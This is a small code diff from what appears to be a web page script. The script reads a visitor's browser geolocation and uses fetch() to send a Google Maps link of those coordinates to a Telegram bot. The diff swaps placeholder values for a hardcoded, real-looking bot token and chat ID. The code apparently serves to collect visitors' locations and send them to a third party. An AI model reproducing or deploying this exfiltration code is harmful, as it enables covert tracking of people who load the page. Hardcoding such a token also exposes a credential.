@@ -15,8 +15,8 @@
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
 
-          const telegramBotToken = 'REPLACE_WITH_YOUR_BOT_TOKEN';
-          const chatId = 'REPLACE_WITH_YOUR_CHAT_ID';
+          const telegramBotToken = '7619651894:AAHbxlVdBo_mU7X99JgWWkwJobEv6ANxuQ4';
+          const chatId = '7856523945';
           const message = `Location: https://maps.google.com/?q=${latitude},${longitude}`;
 
           fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
